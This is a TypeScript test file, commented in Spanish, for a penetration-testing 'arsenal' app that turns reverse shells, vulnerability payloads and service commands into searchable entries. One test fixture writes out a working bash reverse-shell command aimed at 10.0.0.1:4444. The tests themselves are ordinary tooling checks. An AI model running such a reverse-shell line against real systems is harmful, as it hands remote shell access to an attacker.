/**
 * Tests del tipo unificado `SelectablePayload` y sus mappers.
 *
 * Cubre:
 *   - fuzzyMatch
 *   - selectionId
 *   - shellToSelectable
 *   - vulnToSelectable
 *   - serviceToSelectable
 *   - CATEGORY_META y NOISE_META
 *   - DEFAULT_PLACEHOLDERS
 */

import { describe, it, expect } from 'vitest'
import {
  fuzzyMatch,
  selectionId,
  shellToSelectable,
  vulnToSelectable,
  serviceToSelectable,
  CATEGORY_META,
  NOISE_META,
  DEFAULT_PLACEHOLDERS,
  type SelectablePayload,
  type ArsenalPlaceholders,
} from '../arsenal-types'
import { REVERSE_SHELLS, type ReverseShell } from '../reverse-shells'
import { VULN_PAYLOADS, type VulnPayload } from '../vuln-payloads'
import { SERVICE_PAYLOADS, type ServicePayload } from '../service-payloads'

// ==========================================================
// DEFAULT_PLACEHOLDERS
// ==========================================================
describe('DEFAULT_PLACEHOLDERS', () => {
  it('tiene todas las claves esperadas', () => {
    const expected: (keyof ArsenalPlaceholders)[] = [
      'LHOST', 'LPORT', 'TARGET', 'USER', 'PASS', 'HASH', 'DOMAIN',
      'COLLAB', 'PORT', 'PARAM', 'INDEX', 'ROLE_NAME', 'INTERFACE',
    ]
    for (const key of expected) {
      expect(DEFAULT_PLACEHOLDERS).toHaveProperty(key)
      expect(typeof DEFAULT_PLACEHOLDERS[key]).toBe('string')
    }
  })

  it('LHOST tiene un valor por defecto razonable', () => {
    expect(DEFAULT_PLACEHOLDERS.LHOST).toMatch(/^10\.|^192\.|^172\./)
  })
})

// ==========================================================
// selectionId
// ==========================================================
describe('selectionId', () => {
  it('genera formato "category:sourceId"', () => {
    expect(selectionId('shell', 'bash-tcp')).toBe('shell:bash-tcp')
    expect(selectionId('vuln', 'sqli-1')).toBe('vuln:sqli-1')
    expect(selectionId('service', 'smb-1')).toBe('service:smb-1')
  })

  it('es determinista', () => {
    expect(selectionId('shell', 'x')).toBe(selectionId('shell', 'x'))
  })
})

// ==========================================================
// fuzzyMatch
// ==========================================================
describe('fuzzyMatch', () => {
  const makePayload = (overrides: Partial<SelectablePayload> = {}): SelectablePayload => ({
    id: 'shell:test',
    sourceId: 'test',
    category: 'shell',
    subcategory: 'linux',
    name: 'Bash TCP',
    preview: 'bash -i >& /dev/tcp/...',
    fullContent: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    tags: ['bash', 'dev-tcp'],
    canSendToListener: true,
    canSendToNotes: true,
    ...overrides,
  })

  it('query vacío devuelve true', () => {
    expect(fuzzyMatch('', makePayload())).toBe(true)
  })

  it('query solo espacios devuelve true', () => {
    expect(fuzzyMatch('   ', makePayload())).toBe(true)
  })

  it('match directo en name', () => {
    expect(fuzzyMatch('bash', makePayload())).toBe(true)
  })

  it('match case-insensitive', () => {
    expect(fuzzyMatch('BASH', makePayload())).toBe(true)
    expect(fuzzyMatch('bash', makePayload({ name: 'BASH' }))).toBe(true)
  })

  it('match en preview', () => {
    expect(fuzzyMatch('/dev/tcp', makePayload())).toBe(true)
  })

  it('match en tag', () => {
    expect(fuzzyMatch('dev-tcp', makePayload())).toBe(true)
  })

  it('match en subcategory', () => {
    expect(fuzzyMatch('linux', makePayload())).toBe(true)
  })

  it('fuzzy: caracteres en orden', () => {
    // "bht" matchea "Bash TCP" (B, then h from "bash", then T from "TCP")
    expect(fuzzyMatch('bht', makePayload())).toBe(true)
  })

  it('no matchea si los caracteres están fuera de orden', () => {
    expect(fuzzyMatch('thb', makePayload())).toBe(false)
  })

  it('no matchea query inexistente', () => {
    expect(fuzzyMatch('zzzzzz', makePayload())).toBe(false)
  })
})

// ==========================================================
// CATEGORY_META / NOISE_META
// ==========================================================
describe('CATEGORY_META', () => {
  it('tiene las 3 categorías', () => {
    expect(CATEGORY_META).toHaveProperty('shell')
    expect(CATEGORY_META).toHaveProperty('vuln')
    expect(CATEGORY_META).toHaveProperty('service')
  })

  it('cada categoría tiene label/icon/color', () => {
    for (const key of ['shell', 'vuln', 'service'] as const) {
      expect(CATEGORY_META[key].label).toBeTruthy()
      expect(CATEGORY_META[key].icon).toBeTruthy()
      expect(CATEGORY_META[key].color).toBeTruthy()
    }
  })
})

describe('NOISE_META', () => {
  it('tiene los 3 niveles', () => {
    expect(NOISE_META).toHaveProperty('stealth')
    expect(NOISE_META).toHaveProperty('normal')
    expect(NOISE_META).toHaveProperty('noisy')
  })

  it('cada nivel tiene label/color/bg', () => {
    for (const key of ['stealth', 'normal', 'noisy'] as const) {
      expect(NOISE_META[key].label).toBeTruthy()
      expect(NOISE_META[key].color).toBeTruthy()
      expect(NOISE_META[key].bg).toBeTruthy()
    }
  })
})

// ==========================================================
// shellToSelectable
// ==========================================================
describe('shellToSelectable', () => {
  it('mapea un ReverseShell correctamente', () => {
    const shell: ReverseShell = REVERSE_SHELLS.find(s => s.id === 'bash-tcp')!
    const payload = shellToSelectable(shell, DEFAULT_PLACEHOLDERS)

    expect(payload.id).toBe('shell:bash-tcp')
    expect(payload.sourceId).toBe('bash-tcp')
    expect(payload.category).toBe('shell')
    expect(payload.subcategory).toBe(shell.platform)
    expect(payload.name).toBe(shell.name)
    expect(payload.canSendToListener).toBe(true)
    expect(payload.canSendToNotes).toBe(true)
  })

  it('renderiza el payload con los placeholders', () => {
    const shell: ReverseShell = REVERSE_SHELLS.find(s => s.id === 'bash-tcp')!
    const custom: ArsenalPlaceholders = {
      ...DEFAULT_PLACEHOLDERS,
      LHOST: '10.0.0.99',
      LPORT: '9999',
    }
    const payload = shellToSelectable(shell, custom)
    expect(payload.fullContent).toContain('10.0.0.99')
    expect(payload.fullContent).toContain('9999')
    expect(payload.fullContent).not.toContain('{LHOST}')
  })

  it('preview no tiene saltos de línea', () => {
    const shell: ReverseShell = REVERSE_SHELLS.find(s => s.id === 'bash-tcp')!
    const payload = shellToSelectable(shell, DEFAULT_PLACEHOLDERS)
    expect(payload.preview).not.toContain('\n')
  })

  it('funciona con todos los shells del dataset', () => {
    for (const shell of REVERSE_SHELLS) {
      const payload = shellToSelectable(shell, DEFAULT_PLACEHOLDERS)
      expect(payload.id).toBe(`shell:${shell.id}`)
      expect(payload.category).toBe('shell')
      expect(payload.fullContent).toBeTruthy()
    }
  })
})

// ==========================================================
// vulnToSelectable
// ==========================================================
describe('vulnToSelectable', () => {
  it('mapea un VulnPayload correctamente', () => {
    const vuln: VulnPayload = VULN_PAYLOADS[0]
    const payload = vulnToSelectable(vuln, DEFAULT_PLACEHOLDERS)

    expect(payload.id).toBe(`vuln:${vuln.id}`)
    expect(payload.sourceId).toBe(vuln.id)
    expect(payload.category).toBe('vuln')
    expect(payload.subcategory).toBe(vuln.category)
    expect(payload.name).toBe(vuln.name)
    expect(payload.noise).toBe(vuln.noise)
    expect(payload.canSendToListener).toBe(false)
    expect(payload.canSendToNotes).toBe(true)
  })

  it('renderiza placeholders en el payload', () => {
    const vuln: VulnPayload = VULN_PAYLOADS.find(p => p.payload.includes('{COLLAB}'))
    if (!vuln) return // si no existe, no test
    const custom: ArsenalPlaceholders = {
      ...DEFAULT_PLACEHOLDERS,
      COLLAB: 'abc.oastify.com',
    }
    const payload = vulnToSelectable(vuln, custom)
    expect(payload.fullContent).toContain('abc.oastify.com')
  })

  it('funciona con todos los payloads del dataset', () => {
    for (const vuln of VULN_PAYLOADS) {
      const payload = vulnToSelectable(vuln, DEFAULT_PLACEHOLDERS)
      expect(payload.id).toBe(`vuln:${vuln.id}`)
      expect(payload.category).toBe('vuln')
    }
  })
})

// ==========================================================
// serviceToSelectable
// ==========================================================
describe('serviceToSelectable', () => {
  it('mapea un ServicePayload correctamente', () => {
    const svc: ServicePayload = SERVICE_PAYLOADS[0]
    const payload = serviceToSelectable(svc, DEFAULT_PLACEHOLDERS)

    expect(payload.id).toBe(`service:${svc.id}`)
    expect(payload.sourceId).toBe(svc.id)
    expect(payload.category).toBe('service')
    expect(payload.subcategory).toBe(svc.category)
    expect(payload.name).toBe(svc.name)
    expect(payload.tool).toBe(svc.tool)
    expect(payload.canSendToListener).toBe(false)
    expect(payload.canSendToNotes).toBe(true)
  })

  it('renderiza placeholders', () => {
    const svc: ServicePayload = SERVICE_PAYLOADS.find(p => p.command.includes('{TARGET}'))!
    const custom: ArsenalPlaceholders = {
      ...DEFAULT_PLACEHOLDERS,
      TARGET: '10.10.10.5',
    }
    const payload = serviceToSelectable(svc, custom)
    expect(payload.fullContent).toContain('10.10.10.5')
  })

  it('funciona con todos los payloads del dataset', () => {
    for (const svc of SERVICE_PAYLOADS) {
      const payload = serviceToSelectable(svc, DEFAULT_PLACEHOLDERS)
      expect(payload.id).toBe(`service:${svc.id}`)
      expect(payload.category).toBe('service')
    }
  })
})

// ==========================================================
// Consistencia global
// ==========================================================
describe('arsenal-types — consistencia', () => {
  it('todos los IDs generados desde cualquier dataset son únicos', () => {
    const ids = new Set<string>()

    for (const s of REVERSE_SHELLS) {
      ids.add(shellToSelectable(s, DEFAULT_PLACEHOLDERS).id)
    }
    for (const v of VULN_PAYLOADS) {
      ids.add(vulnToSelectable(v, DEFAULT_PLACEHOLDERS).id)
    }
    for (const sv of SERVICE_PAYLOADS) {
      ids.add(serviceToSelectable(sv, DEFAULT_PLACEHOLDERS).id)
    }

    const total = REVERSE_SHELLS.length + VULN_PAYLOADS.length + SERVICE_PAYLOADS.length
    expect(ids.size).toBe(total)
  })

  it('preview nunca excede 100 caracteres', () => {
    for (const s of REVERSE_SHELLS) {
      const p = shellToSelectable(s, DEFAULT_PLACEHOLDERS)
      expect(p.preview.length).toBeLessThanOrEqual(100)
    }
    for (const v of VULN_PAYLOADS) {
      const p = vulnToSelectable(v, DEFAULT_PLACEHOLDERS)
      expect(p.preview.length).toBeLessThanOrEqual(100)
    }
    for (const sv of SERVICE_PAYLOADS) {
      const p = serviceToSelectable(sv, DEFAULT_PLACEHOLDERS)
      expect(p.preview.length).toBeLessThanOrEqual(100)
    }
  })
})
